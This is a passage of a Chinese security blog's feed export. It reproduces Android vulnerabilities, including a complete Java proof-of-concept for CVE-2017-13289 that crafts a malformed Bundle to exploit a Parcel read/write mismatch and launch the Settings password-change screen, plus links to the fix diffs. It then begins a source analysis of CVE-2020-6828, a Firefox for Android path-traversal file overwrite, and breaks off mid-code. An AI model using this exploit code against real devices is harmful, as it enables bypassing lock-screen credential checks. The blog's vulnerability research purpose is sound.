<span class="number">0</span>, length); <span class="comment">//</span></span><br><span class="line">    bundleData.setDataPosition(<span class="number">0</span>);<span class="comment">//移动Parcel的读写指针位置到开头</span></span><br><span class="line">    retBundle.readFromParcel(bundleData);</span><br><span class="line">    <span class="keyword">return</span> retBundle;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修复措施：<a href="https://android.googlesource.com/platform/frameworks/base/+/b796cd32a45bcc0763c50cc1a0cc8236153dcea3^!/#F0">Diff - b796cd32a45bcc0763c50cc1a0cc8236153dcea3^! - platform/frameworks/base - Git at Google (googlesource.com)</a></p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20210912202325193.png" alt="image-20210912202325193"></p><h1 id="CVE-2017-13289"><a href="#CVE-2017-13289" class="headerlink" title="CVE-2017-13289"></a>CVE-2017-13289</h1><p>对应的类是<a href="https://android.googlesource.com/platform/frameworks/base/+/refs/tags/android-8.0.0_r1/wifi/java/android/net/wifi/RttManager.java">wifi/java/android/net/wifi/RttManager.java - platform/frameworks/base - Git at Google (googlesource.com)</a>,有5个内部类实现了<code>Parcelable</code>，一一观察，可以发现问题出在<code>ParcelableRttResults</code>这里。</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20210913162036354.png" alt="image-20210913162036354"></p><p>这个内部类的序列化工作涉及到了很多的字段，缺陷代码如图标注所示，本应用<code>writeByteArray()</code>却写成了<code>writeByte()</code>，多数情况下会少写出若干<code>Byte</code>，从而造成内存向前错位。<br>关于<code>writeByte()</code>、<code>readByte()</code>、<code>readByteArray()</code>的函数实现如下所示：<br>读入<code>ByteArray</code>时，会先读一个<code>int</code>表示Array的长度，后续的一定长度的内存空间才是Array的具体内容。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Parcelable.java</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">Parcelable</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">writeByte</span><span class="params">(<span class="keyword">byte</span> val)</span> </span>&#123;</span><br><span class="line">        writeInt(val);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">byte</span> <span class="title">readByte</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">byte</span>)(readInt() &amp; <span class="number">0xff</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">readByteArray</span><span class="params">(<span class="keyword">byte</span>[] val)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">boolean</span> valid = nativeReadByteArray(mNativePtr, val, (val != <span class="keyword">null</span>) ? val.length : <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (!valid) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">&quot;bad array lengths&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//android_os_Parcel.cpp</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> JNINativeMethod gParcelMethods[] = &#123;</span><br><span class="line">    ......</span><br><span class="line">&#123;<span class="string">&quot;nativeWriteByteArray&quot;</span>,      <span class="string">&quot;(J[BII)V&quot;</span>, (<span class="keyword">void</span>*)android_os_Parcel_writeByteArray&#125;,</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> <span class="built_in">android_os_Parcel_writeByteArray</span>(JNIEnv* env, jclass clazz, jlong nativePtr, </span><br><span class="line">                                             jobject data, jint offset, jint length)</span><br><span class="line">&#123;</span><br><span class="line">    Parcel* parcel = <span class="keyword">reinterpret_cast</span>&lt;Parcel*&gt;(nativePtr);</span><br><span class="line">    <span class="keyword">if</span> (parcel == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">status_t</span> err = parcel-&gt;<span class="built_in">writeInt32</span>(length);</span><br><span class="line">    <span class="keyword">if</span> (err != NO_ERROR) &#123;</span><br><span class="line">        <span class="built_in">signalExceptionForError</span>(env, clazz, err);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">void</span>* dest = parcel-&gt;<span class="built_in">writeInplace</span>(length);</span><br><span class="line">    <span class="keyword">if</span> (dest == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">signalExceptionForError</span>(env, clazz, NO_MEMORY);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    jbyte* ar = (jbyte*)env-&gt;<span class="built_in">GetPrimitiveArrayCritical</span>((jarray)data, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (ar) &#123;</span><br><span class="line">        <span class="built_in">memcpy</span>(dest, ar + offset, length);</span><br><span class="line">        env-&gt;<span class="built_in">ReleasePrimitiveArrayCritical</span>((jarray)data, ar, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>构造方法如下：</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20210913164445607.png" alt="image-20210913164445607"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Bundle <span class="title">poc2017_13289</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Bundle retBundle = <span class="keyword">new</span> Bundle();</span><br><span class="line">    Parcel bundleData = Parcel.obtain();</span><br><span class="line">    Parcel craftData = Parcel.obtain();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//craftData是传递的Bundle载荷，这里手动构造载荷内容，然后补上Bundle格式头</span></span><br><span class="line">    craftData.writeInt(<span class="number">3</span>); <span class="comment">// 总共传递3个对象,三个key-value对</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 第一个Key为VerifyCredentialResponse，它将用来引起内存错位从而绕过检查</span></span><br><span class="line">    craftData.writeString(<span class="string">&quot;PRRPRR&quot;</span>);<span class="comment">//是这个object的名字,似乎长度有些要求</span></span><br><span class="line">    craftData.writeInt(<span class="number">4</span>); <span class="comment">// VAL_PARCELABLE = 4</span></span><br><span class="line">    craftData.writeString(<span class="string">&quot;android.net.wifi.RttManager$ParcelableRttResults&quot;</span>); <span class="comment">// value类型为ParcelableRttResults</span></span><br><span class="line">    craftData.writeInt(<span class="number">1</span>);<span class="comment">//result num</span></span><br><span class="line">    craftData.writeString(<span class="string">&quot;bssid&quot;</span>);<span class="comment">//bssid</span></span><br><span class="line">    craftData.writeInt(<span class="number">1</span>);<span class="comment">//burstNumber</span></span><br><span class="line">    craftData.writeInt(<span class="number">1</span>);<span class="comment">//measurementFrameNumber</span></span><br><span class="line">    craftData.writeInt(<span class="number">1</span>);<span class="comment">//successMeasurementFrameNumber</span></span><br><span class="line">    craftData.writeInt(<span class="number">1</span>);<span class="comment">//frameNumberPerBurstPeer</span></span><br><span class="line">    craftData.writeInt(<span class="number">1</span>);<span class="comment">//status</span></span><br><span class="line">    craftData.writeInt(<span class="number">1</span>);<span class="comment">//measurementType</span></span><br><span class="line">    craftData.writeInt(<span class="number">1</span>);<span class="comment">//retryAfterDuration</span></span><br><span class="line"></span><br><span class="line">    craftData.writeLong(<span class="number">1</span>);<span class="comment">//ts</span></span><br><span class="line"></span><br><span class="line">    craftData.writeInt(<span class="number">1</span>);<span class="comment">//rssi</span></span><br><span class="line">    craftData.writeInt(<span class="number">1</span>);<span class="comment">//rssiSpread</span></span><br><span class="line">    craftData.writeInt(<span class="number">1</span>);<span class="comment">//txRate</span></span><br><span class="line"></span><br><span class="line">    craftData.writeLong(<span class="number">1</span>);<span class="comment">//rtt</span></span><br><span class="line">    craftData.writeLong(<span class="number">1</span>);<span class="comment">//rttStandardDeviation</span></span><br><span class="line">    craftData.writeLong(<span class="number">1</span>);<span class="comment">//rttSpread</span></span><br><span class="line"></span><br><span class="line">    craftData.writeInt(<span class="number">1</span>);<span class="comment">//distance</span></span><br><span class="line">    craftData.writeInt(<span class="number">1</span>);<span class="comment">//distanceStandardDeviation</span></span><br><span class="line">    craftData.writeInt(<span class="number">1</span>);<span class="comment">//distanceSpread</span></span><br><span class="line">    craftData.writeInt(<span class="number">1</span>);<span class="comment">//burstDuration</span></span><br><span class="line">    craftData.writeInt(<span class="number">1</span>);<span class="comment">//negotiatedBurstNum</span></span><br><span class="line"></span><br><span class="line">    craftData.writeByte((<span class="keyword">byte</span>) <span class="number">255</span>);<span class="comment">//LCI.id=0xFF,不读入length和LCI.data</span></span><br><span class="line"></span><br><span class="line">    craftData.writeByte((<span class="keyword">byte</span>) <span class="number">4</span>);<span class="comment">//LCR.id=4，开始读入length=4 LCR.data= [4 1234]</span></span><br><span class="line">    craftData.writeByte((<span class="keyword">byte</span>) <span class="number">4</span>);<span class="comment">// length</span></span><br><span class="line">    craftData.writeByteArray( <span class="keyword">new</span> <span class="keyword">byte</span>[]&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;); <span class="comment">//data</span></span><br><span class="line"></span><br><span class="line">    craftData.writeByte((<span class="keyword">byte</span>) <span class="number">1</span>);<span class="comment">//secure</span></span><br><span class="line"></span><br><span class="line">    craftData.writeInt(<span class="number">1</span>);<span class="comment">//第二个Key的长度，后来被解析为secure</span></span><br><span class="line">    craftData.writeInt(<span class="number">4</span>);<span class="comment">//第二个Key的值，后来被接卸为key-Len</span></span><br><span class="line">    craftData.writeInt(<span class="number">13</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 接下来构造ByteArray，或者说内含Intent的ByteArray</span></span><br><span class="line">    craftData.writeInt(-<span class="number">1</span>); <span class="comment">// 这个位置用于存放ByteArray部分的长度，先占位，构造完之后再来写入</span></span><br><span class="line">    <span class="keyword">int</span> ByteArrayStartPos = craftData.dataPosition();  <span class="comment">// 记录ByteArray部分在craftData中起始位置，因为接下来要构造ByteArray了</span></span><br><span class="line"></span><br><span class="line">    craftData.writeInt(<span class="number">0</span>);</span><br><span class="line">    craftData.writeInt(<span class="number">6</span>);</span><br><span class="line">    craftData.writeLong(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    craftData.writeString(AccountManager.KEY_INTENT);</span><br><span class="line">    craftData.writeInt(<span class="number">4</span>); <span class="comment">//intent也是一个parcel</span></span><br><span class="line">    craftData.writeString(<span class="string">&quot;android.content.Intent&quot;</span>);<span class="comment">// value类型为intent，将被按照intent格式解析</span></span><br><span class="line">    craftData.writeString(Intent.ACTION_RUN); <span class="comment">// Intent Action 这里开始是intent的属性</span></span><br><span class="line">    Uri.writeToParcel(craftData, <span class="keyword">null</span>); <span class="comment">// Uri</span></span><br><span class="line">    craftData.writeString(<span class="keyword">null</span>); <span class="comment">// Type</span></span><br><span class="line">    craftData.writeInt(<span class="number">0x10000000</span>); <span class="comment">// Flags</span></span><br><span class="line">    craftData.writeString(<span class="keyword">null</span>); <span class="comment">// Package</span></span><br><span class="line">    craftData.writeString(<span class="string">&quot;com.android.settings&quot;</span>);</span><br><span class="line">    craftData.writeString(<span class="string">&quot;com.android.settings.ChooseLockPassword&quot;</span>);</span><br><span class="line">    craftData.writeInt(<span class="number">0</span>); <span class="comment">//SourceBounds</span></span><br><span class="line">    craftData.writeInt(<span class="number">0</span>); <span class="comment">//Categories</span></span><br><span class="line">    craftData.writeInt(<span class="number">0</span>); <span class="comment">//Selector</span></span><br><span class="line">    craftData.writeInt(<span class="number">0</span>); <span class="comment">//ClipData</span></span><br><span class="line">    craftData.writeInt(-<span class="number">2</span>); <span class="comment">//ContentUserHint</span></span><br><span class="line">    craftData.writeBundle(<span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> ByteArrayEndPos = craftData.dataPosition(); <span class="comment">// byteArray到此结束，记录结束位置</span></span><br><span class="line">    <span class="keyword">int</span> ByteArrayLength = ByteArrayEndPos - ByteArrayStartPos; <span class="comment">// 计算ByteArray数据的长度</span></span><br><span class="line">    craftData.setDataPosition(ByteArrayStartPos - <span class="number">4</span>);  <span class="comment">// 把读写指针位移动到ByteArray部分起始位-4,即-1所在的位置</span></span><br><span class="line">    craftData.writeInt(ByteArrayLength);<span class="comment">// 在ByteArray部分前写入ByteArray这段数据的长度</span></span><br><span class="line">    craftData.setDataPosition(ByteArrayEndPos);<span class="comment">// 将读写指针移动到最后</span></span><br><span class="line">    Log.i(TAG, <span class="string">&quot;INTENT length = &quot;</span> + ByteArrayLength);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 这里做个用于填充的键值对</span></span><br><span class="line">    craftData.writeString(<span class="string">&quot;Padding&quot;</span>);</span><br><span class="line">    craftData.writeInt(<span class="number">0</span>); <span class="comment">// VAL_STRING</span></span><br><span class="line">    craftData.writeString(<span class="string">&quot;Padding&quot;</span>); <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> length  = craftData.dataSize();</span><br><span class="line">    bundleData.writeInt(length); <span class="comment">//所有数据的长度</span></span><br><span class="line">    bundleData.writeInt(<span class="number">0x4c444E42</span>); <span class="comment">//Bundle魔数</span></span><br><span class="line">    bundleData.appendFrom(craftData, <span class="number">0</span>, length); <span class="comment">//</span></span><br><span class="line">    bundleData.setDataPosition(<span class="number">0</span>);<span class="comment">//移动Parcel的读写指针位置到开头</span></span><br><span class="line">    retBundle.readFromParcel(bundleData);</span><br><span class="line">    <span class="keyword">return</span> retBundle;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修复措施：<a href="https://android.googlesource.com/platform/frameworks/base/+/5a3d2708cd2289a4882927c0e2cb0d3c21a99c02^!/#F0">Diff - 5a3d2708cd2289a4882927c0e2cb0d3c21a99c02^! - platform/frameworks/base - Git at Google (googlesource.com)</a></p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20210913164553310.png" alt="image-20210913164553310"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;参考相关文章，完成一下Android的几个反序列化漏洞的PoC代码。原理是相似的，只是出现序列化缺陷的类有不同，构造方法也有细微的区别。&lt;/p&gt;
&lt;p&gt;CEV-2017-13311和CVE-2017-13315只能以后有时间再补上了。&lt;/p&gt;</summary>
    
    
    
    
    <category term="Android" scheme="http://slient2009.github.io/tags/Android/"/>
    
    <category term="CVE" scheme="http://slient2009.github.io/tags/CVE/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2020-6828 复现</title>
    <link href="http://slient2009.github.io/2021/09/09/CVE-2020-6828/"/>
    <id>http://slient2009.github.io/2021/09/09/CVE-2020-6828/</id>
    <published>2021-09-09T04:00:00.000Z</published>
    <updated>2021-09-09T08:52:27.000Z</updated>
    
    <content type="html"><![CDATA[<p>参考相关博客，对CVE-2020-6828进行复现。该漏洞因为没有对文件名变量进行处理，导致任意文件覆盖。</p><span id="more"></span><h1 id="CVE-2020-6828"><a href="#CVE-2020-6828" class="headerlink" title="CVE-2020-6828"></a>CVE-2020-6828</h1><blockquote><p>参考文章：<a href="https://blog.ssologin.xyz/2021/03/23/cve-2020-6828-firefox-for-android-arbitrary-file-overwrite">CVE-2020-6828：Firefox for Android任意文件覆盖漏洞分析 | Blog (ssologin.xyz)</a></p></blockquote><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>下载对应版本的Firefox for Android 源代码：<a href="http://ftp.mozilla.org/pub/mobile/releases/68.5.0/source/">/pub/mobile/releases/68.5.0/source/</a></p><p>Firefox允许外部应用调用它打开一个链接，或者说URI，这是一个合理的功能。<br>负责具体处理的是<code>org.mozilla.gecko.LauncherActivity</code>，目录是<code>\firefox-68.5.0\mobile\android\base\java\org\mozilla\gecko\LauncherActivity</code>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LauncherActivity</span> <span class="keyword">extends</span> <span class="title">Activity</span> </span>&#123;</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> SafeIntent safeIntent = <span class="keyword">new</span> SafeIntent(getIntent());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Is this deep link?</span></span><br><span class="line">        <span class="keyword">if</span> (isDeepLink(safeIntent)) &#123;</span><br><span class="line">            dispatchDeepLink(safeIntent);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (isShutdownIntent(safeIntent)) &#123;</span><br><span class="line">            dispatchShutdownIntent();</span><br><span class="line">        <span class="comment">// Is this web app?</span></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (isWebAppIntent(safeIntent)) &#123;</span><br><span class="line">            dispatchWebAppIntent();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// If it&#x27;s not a view intent, it won&#x27;t be a custom tabs intent either, and for content URI</span></span><br><span class="line">        <span class="comment">// let&#x27;s handle only with normal tabs for the moment</span></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!isViewIntentWithURL(safeIntent) || isContentUri(safeIntent.getData())) &#123;</span><br><span class="line">            dispatchNormalIntent();</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (isCustomTabsIntent(safeIntent) &amp;&amp; isCustomTabsEnabled(<span class="keyword">this</span>) ) &#123;</span><br><span class="line">            dispatchCustomTabsIntent();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Can we dispatch this VIEW action intent to the tab queue service?</span></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!safeIntent.getBooleanExtra(BrowserContract.SKIP_TAB_QUEUE_FLAG, <span class="keyword">false</span>)</span><br><span class="line">                &amp;&amp; TabQueueHelper.TAB_QUEUE_ENABLED</span><br><span class="line">                &amp;&amp; TabQueueHelper.isTabQueueEnabled(<span class="keyword">this</span>)) &#123;</span><br><span class="line">            dispatchTabQueueIntent();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Dispatch this VIEW action intent to the browser.</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            dispatchNormalIntent();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        finish();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最终来到<code>org.mozilla.gecko.IntentHelper.openNoHandler</code>，在这里完成对传入的Uri的检查和处理。<br>（如何跟过来还需要尝试多种追踪方法，只用frida打印调用栈还不够。不过目前看来是创建了handler通过回调完成的，在<code>org.mozilla.gecko.IntentHelper.handleMessage()</code>中调用了<code>openNoHandler()</code>）</p><p>如果传入的Uri是<code>Content Uri</code>，用<code>FileUtils.resolveContentUri</code>去解析该<code>Content Uri</code>。<br>目标文件路径为：<code>firefox-68.5.0\mobile\android\geckoview\src\main\java\org\mozilla\gecko\util\FileUtils.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">openNoHandler</span><span class="params">(GeckoBundle geckoBundle, EventCallback callback)</span></span>&#123;</span><br><span class="line">    ......</span><br><span class="line">    String theUri = geckoBundle.getString(<span class="string">&quot;uri&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(FileUtils.isContentUri(theUri)) &#123;</span><br><span class="line">        String resolveContentUri = FileUtils.resolveContentUri(IntentHelper.getContext(), intentParseUri.getData());</span><br><span class="line">        <span class="keyword">if</span>(!TextUtils.isEmpty(resolveContentUri)) &#123;</span><br><span class="line">            mGeckoBundle.putString(<span class="string">&quot;uri&quot;</span>, resolveContentUri);</span><br><span class="line">            mGeckoBundle.putBoolean(<span class="string">&quot;isFallback&quot;</span>, <span class="keyword">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        callback.sendError(mGeckoBundle);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关注Uri解析方法<code>resolveContentUri()</code>。（不知道字段填充和回调操作的具体作用）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">resolveContentUri</span><span class="params">(<span class="keyword">final</span> Context context, <span class="keyword">final</span> Uri uri)</span> </span>&#123;</span><br><span class="line">    String path = getOriginalFilePathFromUri(context, uri);</span><br><span class="line">    <span class="keyword">if</span> (TextUtils.isEmpty(path)) &#123;</span><br><span class="line">        path = getTempFilePathFromContentUri(context, uri);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> !TextUtils.isEmpty(path) ? String.format(<span class="string">&quot;file://%s&quot;</span>, path) : path;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>个人理解：既然接收到了来自外部的Uri，应该去尝试解析看看它到底是个什么玩意儿。<br>可能指向一个文件，例如用浏览器打开图片什么的。那么就先用<code>ContentUriUtils.getOriginalFilePathFromUri()</code>去看看有没有这个文件，有就返回文件的绝对路径。<br>也有可能指向一个<code>content provider</code>中的资源，还没有保存为文件。那么就用<code>ContentUriUtils.getTempFilePathFromContentUri()</code>去把这个资源读出来保存为文件，然后也返回文件的绝对路径。<br>先解析文件，如果为空，再尝试解析<code>content</code>资源。</p><p>重点关注<code>getTempFilePathFromContentUri()</code>方法，它的缺陷就是通过<code>getFileNameFromContentUri</code>直接把<code>content</code>的<code>_display_name_</code>字段读出作为文件名，直接拼接到目录后面作为文件的绝对路径。<br>没有经过处理的文件名变量可能导致任意路径的文件覆盖。<br>源代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">public</span> <span class="keyword">static</span> <span class="meta">@Nullable</span> <span class="function">String <span class="title">getTempFilePathFromContentUri</span><span class="params">(<span class="keyword">final</span> Context context, <span class="keyword">final</span> Uri contentUri)</span> </span>&#123;</span><br><span class="line">     <span class="comment">//copy file and send new file path</span></span><br><span class="line">     <span class="keyword">final</span> String fileName = FileUtils.getFileNameFromContentUri(context, contentUri);</span><br><span class="line">     <span class="comment">//从content中获取_display_name_字段作为文件名返回</span></span><br><span class="line">     <span class="keyword">final</span> File folder = <span class="keyword">new</span> File(context.getCacheDir(), <span class="string">&quot;contentUri&quot;</span>); </span><br><span class="line">     <span class="comment">// 构造目录/data/data/&lt;package-name&gt;/cache/contentUri</span></span><br><span class="line">     <span class="keyword">boolean</span> success = <span class="keyword">true</span>;</span><br><span class="line">     <span class="keyword">if</span> (!folder.exists()) &#123;</span><br><span class="line">         success = folder.mkdirs();</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">if</span> (!TextUtils.isEmpty(fileName) &amp;&amp; success) &#123;</span><br><span class="line">         File copyFile = <span class="keyword">new</span> File(folder.getPath(), fileName);<span class="comment">//直接拼接文件名和目录，可能覆盖任意路径</span></span><br><span class="line">         FileUtils.copy(context, contentUri, copyFile);</span><br><span class="line">         <span class="keyword">return</span> copyFile.getAbsolutePath();</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="comment">//FileUtils.getFileNameFromContentUri()，读取uri的_display_name字段直接返回</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">getFileNameFromContentUri</span><span class="params">(<span class="keyword">final</span> Context context, <span class="keyword">final</span> Uri uri)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">final</span> ContentResolver cr = context.getContentResolver();</span><br><span class="line">    <span 